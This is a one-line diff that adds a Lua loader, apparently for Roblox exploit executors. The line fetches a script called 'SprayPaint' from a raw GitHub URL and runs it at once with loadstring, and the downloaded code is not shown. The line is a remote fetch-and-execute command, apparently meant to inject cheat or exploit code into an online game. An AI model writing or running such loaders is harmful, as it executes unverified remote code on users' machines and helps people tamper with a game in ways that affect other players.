@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/LunarielLovely/Scripts/refs/heads/main/SprayPaint"))()
